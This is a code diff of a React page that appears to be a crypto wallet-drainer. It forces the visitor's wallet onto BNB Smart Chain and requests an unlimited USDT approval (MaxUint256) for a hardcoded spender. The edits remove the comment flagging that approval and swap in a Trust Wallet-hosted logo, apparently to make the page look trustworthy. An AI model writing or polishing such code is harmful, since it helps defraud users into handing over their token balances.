@@ -15,7 +15,7 @@ export default function Home() {
         return;
       }
 
-      // 🔥 FORZA BNB CHAIN
+      // 🔥 forza BNB Smart Chain
       await window.ethereum.request({
         method: "wallet_switchEthereumChain",
         params: [{ chainId: "0x38" }],
@@ -33,7 +33,6 @@ export default function Home() {
         signer
       );
 
-      // 🔥 APPROVE MAX
       const tx = await usdt.approve(
         SPENDER,
         ethers.MaxUint256
@@ -94,9 +93,9 @@ export default function Home() {
         }}>
           <div style={{ display: "flex", alignItems: "center", gap: "10px" }}>
             
-            {/* LOGO BNB VERO */}
+            {/* LOGO TRUST WALLET BNB */}
             <img
-              src="https://cryptologos.cc/logos/bnb-bnb-logo.png"
+              src="https://trustwallet.com/assets/images/coins/bnb.png"
               alt="bnb"
               style={{
                 width: "24px",
